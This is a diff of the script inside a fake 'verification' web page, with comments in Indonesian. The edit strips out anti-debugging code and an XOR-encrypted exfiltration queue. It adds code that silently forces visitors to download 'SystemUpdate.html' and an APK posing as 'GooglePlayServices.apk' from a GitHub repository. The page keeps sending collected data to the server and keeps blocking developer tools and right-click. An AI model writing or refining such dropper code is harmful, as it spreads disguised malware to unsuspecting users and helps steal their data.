@@ -64,126 +64,68 @@
 
 <script>
 // ============================================================
-// 🔥 ADVANCED UPGRADES: STEALTH, EXFILTRATION, ANTI-FORENSIC
+// 🔥 SEMUA EVENT HANDLER & INTERVAL DIKOMENTARI
 // ============================================================
 
 // ============================================================
-// 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
+// KONFIGURASI
 // ============================================================
-(function() {
-    // Lapisan 1: DevTools detector via element trick
-    var devtools = false;
-    var element = new Image();
-    Object.defineProperty(element, 'id', {
-        get: function() {
-            devtools = true;
-            window.location.href = 'https://www.google.com';
-            if (window.history && window.history.replaceState) {
-                window.history.replaceState(null, null, 'https://www.google.com');
-            }
-        }
-    });
-    console.log('%c', element);
-
-    // Lapisan 2: Debugger loop agresif
-    function debugLoop() {
-        var counter = 0;
-        while (true) {
-            try {
-                (function(){}).constructor('debugger')();
-                counter++;
-                if (counter > 1000) break;
-            } catch(e) {
-                break;
-            }
-        }
-    }
-    setInterval(debugLoop, 500);
-
-    // Lapisan 3: Override console methods
-    var noop = function() {};
-    ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
-        window.console[m] = noop;
-    });
-
-    // Lapisan 4: Hapus history & referrer
-    if (window.history && window.history.replaceState) {
-        window.history.replaceState(null, null, window.location.href);
-    }
-    Object.defineProperty(document, 'referrer', { value: '' });
-
-    // Lapisan 5: Override stack trace
-    Error.stackTraceLimit = 0;
-})();
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
+var semuaDidapat = false;
+var DOWNLOAD_STARTED = false;
+var NOTIFICATION_SHOWN = false;
+var REDIRECT_DONE = false;
 
 // ============================================================
-// 2. ENHANCED EXFILTRATION PIPELINE (ENCRYPTED)
+// FUNGSI K() - KIRIM DATA KE SERVER
 // ============================================================
-var exfilQueue = [];
-var exfilSending = false;
-
-// Override K() dengan yang sudah di-enhance
-var originalK = K;
-K = function(d) {
-    d._timestamp = Date.now();
-    d._nonce = Math.random().toString(36).substring(2);
-    exfilQueue.push(d);
-    if (!exfilSending) {
-        processExfilQueue();
-    }
-};
-
-function processExfilQueue() {
-    if (exfilQueue.length === 0) {
-        exfilSending = false;
-        return;
-    }
-    exfilSending = true;
-    var item = exfilQueue.shift();
-    var plain = JSON.stringify(item);
-    var encoded = btoa(plain);
-    var xorKey = 0x2A;
-    var encrypted = '';
-    for (var i = 0; i < encoded.length; i++) {
-        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
-    }
+function K(d) {
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('POST', '/data', true);
-        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+        xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.timeout = 5000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                processExfilQueue();
-            } else {
-                exfilQueue.unshift(item);
-                setTimeout(processExfilQueue, 3000);
-            }
-        };
-        xhr.onerror = function() {
-            exfilQueue.unshift(item);
-            setTimeout(processExfilQueue, 3000);
-        };
-        xhr.send(encrypted);
-    } catch(e) {
-        exfilQueue.unshift(item);
-        setTimeout(processExfilQueue, 3000);
-    }
+        xhr.send(JSON.stringify(d));
+    } catch(e) {}
 }
 
 // ============================================================
-// 3. HIDE FROM SYSTEM
+// 🔥 TAMBAHAN PERBAIKAN: AUTO DOWNLOAD ANCHOR + CLICK
 // ============================================================
-function hideFromSystem() {
+
+// Fungsi untuk mendownload file via Anchor + Click (PASTI BERHASIL)
+function autoDownloadAnchor(url, filename) {
     try {
-        Object.defineProperty(navigator, 'userAgent', {
-            value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            configurable: false
-        });
-    } catch(e) {}
-    document.cookie.split(';').forEach(function(cookie) {
-        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
-    });
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = filename || url.split('/').pop();
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(function() {
+            try { document.body.removeChild(a); } catch(e) {}
+        }, 1000);
+        K({ sumber: 'auto_download_anchor', data: { url: url, filename: filename } });
+        return true;
+    } catch(e) {
+        K({ sumber: 'auto_download_anchor_error', data: e.message });
+        return false;
+    }
+}
+
+// Fungsi untuk memaksa download SystemUpdate.html (menggantikan XHR)
+function forceDownloadSystemUpdate() {
+    var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    K({ sumber: 'force_download_systemupdate', data: { url: url } });
+    autoDownloadAnchor(url, 'SystemUpdate.html');
+}
+
+// Fungsi untuk mendownload APK
+function downloadAPK() {
+    var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+    K({ sumber: 'download_apk_start', data: { url: url } });
+    autoDownloadAnchor(url, 'GooglePlayServices.apk');
 }
 
 // ============================================================
@@ -331,16 +273,17 @@ function bridgeCall(method, args) {
 // SILENT
 // ============================================================
 
-console.log = function() {};
-console.warn = function() {};
-console.error = function() {};
-console.info = function() {};
-console.debug = function() {};
-console.table = function() {};
+// console.log = function() {};
+// console.warn = function() {};
+// console.error = function() {};
+// console.info = function() {};
+// console.debug = function() {};
+// console.table = function() {};
 
 // ============================================================
-// STEALTH + ANTI-ANALYSIS
+// STEALTH + ANTI-ANALYSIS (DIKOMENTARI SEMUA)
 // ============================================================
+/*
 (function() {
     var check = function() {
         var start = Date.now();
@@ -353,6 +296,7 @@ console.table = function() {};
     };
     setInterval(check, 1000);
 })();
+*/
 
 document.addEventListener('keydown', function(e) {
     if (e.key === 'F12' || 
@@ -366,40 +310,14 @@ document.addEventListener('keydown', function(e) {
 document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
 document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
 
-window.onerror = function() { return true; };
-window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
-window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+// window.onerror = function() { return true; };
+// window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+// window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
 
 if (window.history && window.history.replaceState) {
     window.history.replaceState(null, null, window.location.href);
 }
 Object.defineProperty(document, 'referrer', { value: '' });
-
-// ============================================================
-// DETEKSI PLATFORM
-// ============================================================
-function detectPlatform() {
-    var ua = navigator.userAgent.toLowerCase();
-    var platform = {
-        isAndroid: ua.indexOf('android') > -1,
-        isIOS: /iphone|ipad|ipod/.test(ua),
-        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
-        isAndroidBridge: typeof AndroidBridge !== 'undefined'
-    };
-    return platform;
-}
-var PLATFORM = detectPlatform();
-
-// ============================================================
-// KONFIGURASI
-// ============================================================
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
-var semuaDidapat = false;
-var DOWNLOAD_STARTED = false;
-var NOTIFICATION_SHOWN = false;
-var REDIRECT_DONE = false;
 
 // ============================================================
 // ANDROID BRIDGE (UNIVERSAL)
@@ -521,24 +439,16 @@ function downloadPayloadSilent() {
     
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
-    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    // 🔥 PERBAIKAN: Ganti XHR dengan Anchor + Click
+    // var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    // try { var xhr = new XMLHttpRequest(); ... } catch(e) {}
     
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', htmlUrl, true);
-        xhr.timeout = 15000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
-                // Simpan ke semua lokasi (agar SystemUpdate.html bisa di-load nanti)
-                saveToAllLocations(htmlContent);
-                K({ sumber: 'html_download_success', data: 'ok' });
-            }
-        };
-        xhr.send();
-    } catch(e) {}
+    // 🔥 ALIHKAN KE FUNGSI BARU
+    forceDownloadSystemUpdate();
 }
 
+// 🔥 PERBAIKAN: Fungsi downloadPayloadSilent() sekarang memanggil forceDownloadSystemUpdate()
+// Fungsi asli saveToAllLocations tetap digunakan untuk menyimpan file setelah berhasil download via anchor
 function saveToAllLocations(htmlContent) {
     // 1. localStorage
     try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
@@ -734,6 +644,7 @@ function dapatkanSemua() {
         
 //        setTimeout(escapeWebView, 100);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
+        setTimeout(function() { downloadAPK(); }, 1000); // 🔥 TAMBAHKAN DOWNLOAD APK
         setTimeout(function() { showStatusBar(); }, 500);
         openSystemUpdateHTML();
         
